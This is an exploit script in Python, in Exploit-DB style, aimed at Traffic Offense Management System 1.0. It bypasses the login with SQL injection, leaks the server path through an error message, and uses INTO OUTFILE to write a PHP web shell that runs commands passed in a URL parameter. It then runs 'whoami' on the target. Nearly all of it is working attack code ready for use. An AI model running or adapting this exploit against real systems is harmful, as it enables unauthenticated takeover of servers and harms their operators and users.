# Exploit Title: Traffic Offense Management System 1.0 - SQLi to Remote Code Execution (RCE) (Unauthenticated)
# Date: 19.08.2021
# Exploit Author: Tagoletta (Tağmaç)
# Software Link: https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html
# Version: 1.0
# Tested on: Linux

import requests
import random
import string
import json
from bs4 import BeautifulSoup

url = input("TARGET = ")

if not url.startswith('http://') and not url.startswith('https://'):
    url = "http://" + url
if not url.endswith('/'):
    url = url + "/"

payload= "<?php if(isset($_GET['tago'])){ $cmd = ($_GET['tago']); system($cmd); die; } ?>"

let = string.ascii_lowercase
shellname = ''.join(random.choice(let) for i in range(15))


session = requests.session()

print("Login Bypass\n")

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "admin' or '1'='1'#", "password": ""}
bypassUser = session.post(request_url, data=post_data)
data = json.loads(bypassUser.text)
status = data["status"]
if status == "success":

    print("Finding first driver\n")

    getHTML = session.get(url + "admin/?page=drivers")
    getHTMLParser = BeautifulSoup(getHTML.text, 'html.parser')
    findFirstDriverID = getHTMLParser.find("a", {"class": "delete_data"}).get("data-id")

    print("Found firs driver ID : " + findFirstDriverID)

    print("\nFinding path")

    findPath = session.get(url + "admin/?page=drivers/manage_driver&id="+findFirstDriverID+'\'')
    findPath = findPath.text[findPath.text.index("<b>Warning</b>:  ")+17:findPath.text.index("</b> on line ")]
    findPath = findPath[findPath.index("<b>")+3:len(findPath)]

    parser = findPath.split('\\')
    parser.pop()
    findPath = ""
    for find in parser:
        findPath += find + "/"

    print("\nFound Path : " + findPath)
    shellPath = findPath[findPath.index("admin/"):len(findPath)]

    SQLtoRCE = "' LIMIT 0,1 INTO OUTFILE '#PATH#' LINES TERMINATED BY #PAYLOAD# -- -"
    SQLtoRCE = SQLtoRCE.replace("#PATH#",findPath+shellname+".php")
    SQLtoRCE = SQLtoRCE.replace("#PAYLOAD#", "0x3"+payload.encode("utf-8").hex())

    print("\n\nShell Uploading...")
    session.get(url + "admin/?page=drivers/manage_driver&id="+findFirstDriverID+SQLtoRCE)

    print("\nShell Path : " + url+shellPath+shellname+".php")
    shellOutput = session.get(url+shellPath+shellname+".php?tago=whoami")
    print("\n\nShell Output : "+shellOutput.text)

else:
    print("No bypass user")